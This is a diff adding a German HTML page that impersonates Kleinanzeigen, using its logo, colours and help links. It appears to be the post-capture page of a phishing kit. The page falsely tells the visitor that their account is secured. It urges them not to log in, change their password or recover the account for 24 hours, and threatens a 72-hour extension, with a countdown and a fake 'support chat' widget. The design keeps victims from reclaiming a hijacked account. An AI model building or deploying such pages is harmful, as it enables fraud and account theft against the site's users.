@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="de" dir="auto" data-color-scheme="light">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="icon" href="https://www.kleinanzeigen.de/favicon.ico" sizes="32x32">
+  <link rel="icon" href="https://www.kleinanzeigen.de/favicon.svg" type="image/svg+xml">
+  <title>Ihr Konto wurde gesichert — Kleinanzeigen</title>
+  <link rel="stylesheet" href="https://cdn.auth0.com/ulp/react-components/1.173.2/css/main_wcag_compliant.cdn.min.css">
+  <style>
+    :root {
+      --primary-color: #B5E941;
+      --button-font-color: #1D4B00;
+      --link-color: #326916;
+      --title-font-color: #0C0C0B;
+      --font-default-color: #0C0C0B;
+      --font-light-color: #77756F;
+      --widget-background-color: #ffffff;
+      --page-background-color: #ffffff;
+      --font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      --button-height: 44px;
+      --button-border-radius: 9999px;
+      --spacing: 8px;
+      --spacing-2: calc(var(--spacing) * 2);
+      --spacing-3: calc(var(--spacing) * 3);
+      --border-radius-outer: 16px;
+    }
+    body {
+      margin: 0;
+      background: var(--page-background-color);
+      color: var(--font-default-color);
+      font-family: var(--font-family);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+    }
+    .knz-header {
+      display: block;
+      position: sticky;
+      top: 0;
+      z-index: 999;
+      background: var(--widget-background-color);
+      text-align: center;
+      height: 50px;
+      width: 100%;
+      padding: 12px 0;
+      border-bottom: 1px solid #dddbd5;
+    }
+    .knz-header__logo-link { display: inline-block; }
+    .knz-header__logo-img { height: 32px; width: auto; vertical-align: middle; display: block; }
+    .knz-header__back {
+      display: inline-block;
+      position: absolute;
+      left: 0;
+      margin-left: 12px;
+      width: 24px;
+      height: 24px;
+      color: var(--link-color);
+    }
+    .knz-header__back svg { width: 100%; height: 100%; display: block; }
+    .knz-header__help-link { position: absolute; right: 0; margin-right: 12px; color: var(--link-color); text-decoration: none; font-size: 14px; }
+    @media (min-width: 601px) {
+      .knz-header { height: 72px; }
+      .knz-header__logo-img { height: 48px; }
+      .knz-header__back { margin-top: 12px; }
+      .knz-header__help-link { margin-top: 12px; }
+    }
+    .erfolg-page {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 24px 16px 80px;
+      box-sizing: border-box;
+    }
+    .erfolg-card {
+      background: var(--widget-background-color);
+      border-radius: var(--border-radius-outer);
+      padding: 28px 24px;
+      margin-bottom: 20px;
+      box-shadow: 0 1px 3px rgba(0,0,0,.08);
+      border: 1px solid #e8e6e3;
+    }
+    .erfolg-card h1 {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: var(--title-font-color);
+      margin: 0 0 16px;
+      line-height: 1.35;
+    }
+    .erfolg-card p {
+      font-size: 0.9375rem;
+      line-height: 1.55;
+      color: var(--font-default-color);
+      margin: 0 0 12px;
+    }
+    .erfolg-card p:last-child { margin-bottom: 0; }
+    .erfolg-card .erfolg-lead {
+      color: var(--font-light-color);
+      font-size: 0.875rem;
+      margin-bottom: 16px;
+    }
+    .erfolg-card .erfolg-highlight {
+      background: #f0f7e6;
+      border-left: 4px solid var(--link-color);
+      padding: 12px 14px;
+      margin: 16px 0;
+      border-radius: 0 8px 8px 0;
+      font-size: 0.9375rem;
+      line-height: 1.5;
+      color: var(--font-default-color);
+    }
+    .erfolg-countdown-section {
+      text-align: center;
+      margin: 24px 0;
+    }
+    .erfolg-countdown-wrap {
+      display: inline-block;
+      padding: 20px 28px;
+      background: #e9f5e0;
+      border: 2px solid #326916;
+      border-radius: 12px;
+      text-align: center;
+      min-width: 220px;
+    }
+    .erfolg-countdown-label {
+      font-size: 0.8125rem;
+      color: #326916;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+    .erfolg-countdown-time {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #1d4b00;
+      font-variant-numeric: tabular-nums;
+      letter-spacing: 0.02em;
+    }
+    .erfolg-countdown-suffix {
+      font-size: 0.8125rem;
+      color: var(--font-light-color);
+      margin-top: 6px;
+    }
+    .erfolg-chat-note {
+      font-size: 0.875rem;
+      color: var(--font-light-color);
+      margin-top: 20px;
+      padding-top: 16px;
+      border-top: 1px solid #e8e6e3;
+    }
+    .erfolg-btn-wrap { margin-top: 28px; text-align: center; }
+    .erfolg-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      max-width: 280px;
+      padding: 4px var(--spacing-2);
+      min-height: var(--button-height);
+      font-family: inherit;
+      font-size: 0.875rem;
+      font-weight: 700;
+      color: var(--button-font-color);
+      background: var(--primary-color);
+      border: none;
+      border-radius: var(--button-border-radius);
+      cursor: pointer;
+      text-decoration: none;
+      box-sizing: border-box;
+      transition: background-color 0.2s ease, box-shadow 0.2s ease;
+    }
+    .erfolg-btn:hover { background: #a8e035; }
+    .erfolg-btn:active { opacity: 0.95; }
+  </style>
+  <!-- __BRAND_JSON__ -->
+</head>
+<body>
+  <header class="knz-header">
+    <a href="#" id="erfolg-back" class="knz-header__back" aria-label="Zurück">
+      <svg viewBox="0 0 12 12" fill="none">
+        <path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M7.5 2 4 6l3.5 4"></path>
+      </svg>
+    </a>
+    <a href="https://www.kleinanzeigen.de" class="knz-header__logo-link">
+      <img class="knz-header__logo-img" src="https://static.kleinanzeigen.de/static/img/common/logo/logo-kleinanzeigen-horizontal.svg" alt="Kleinanzeigen">
+    </a>
+    <a href="https://hilfe.kleinanzeigen.de/hc/de" target="_blank" rel="noopener" class="knz-header__help-link">Hilfe</a>
+  </header>
+
+  <main class="erfolg-page">
+    <div class="erfolg-card">
+      <h1>Ihr Konto wurde vorübergehend geschützt</h1>
+      <p class="erfolg-lead">Aus Sicherheitsgründen haben wir Ihr Konto temporär gesichert. Das ist eine reine Vorsichtsmaßnahme.</p>
+      <p>Bitte unternehmen Sie in den nächsten 24 Stunden <strong>keine Änderungen</strong> an Ihrem Konto. Dazu gehören unter anderem: erneuter Login-Versuch, Passwort- oder E-Mail-Änderung sowie Kontowiederherstellung.</p>
+      <div class="erfolg-highlight">
+        Jede Aktion am Konto verlängert die Wartezeit automatisch auf bis zu 72 Stunden. Die Entsperrung erfolgt von selbst – Sie müssen nichts tun. Bitte warten Sie einfach ab.
+      </div>
+      <p>So schützen wir Ihr Konto zuverlässig. Vielen Dank für Ihr Verständnis.</p>
+    </div>
+
+    <div class="erfolg-countdown-section">
+      <p style="font-size: 0.9375rem; color: var(--font-default-color); margin-bottom: 10px;">Automatische Entsperrung in:</p>
+      <div class="erfolg-countdown-wrap" id="erfolg-countdown-wrap">
+        <div class="erfolg-countdown-label">Verbleibende Zeit</div>
+        <div class="erfolg-countdown-time" id="erfolg-countdown-time" aria-live="polite">24:00:00</div>
+        <div class="erfolg-countdown-suffix">Stunden : Minuten : Sekunden</div>
+      </div>
+      <p style="font-size: 0.875rem; color: var(--font-light-color); margin-top: 12px; max-width: 320px; margin-left: auto; margin-right: auto;">Danach können Sie Ihr Konto wieder wie gewohnt nutzen.</p>
+    </div>
+
+    <div class="erfolg-card">
+      <p class="erfolg-chat-note">Bei Fragen steht Ihnen der <strong>Support-Chat</strong> zur Verfügung – Sie finden ihn in der <strong>rechten unteren Ecke</strong> dieser Seite.</p>
+    </div>
+
+    <div class="erfolg-btn-wrap">
+      <a href="#" id="erfolg-close" class="erfolg-btn">Verstanden</a>
+    </div>
+  </main>
+
+  <script src="/erfolg-klein.js"></script>
+  <link rel="stylesheet" href="/chat-widget.css">
+  <script src="/chat-widget.js"></script>
+</body>
+</html>
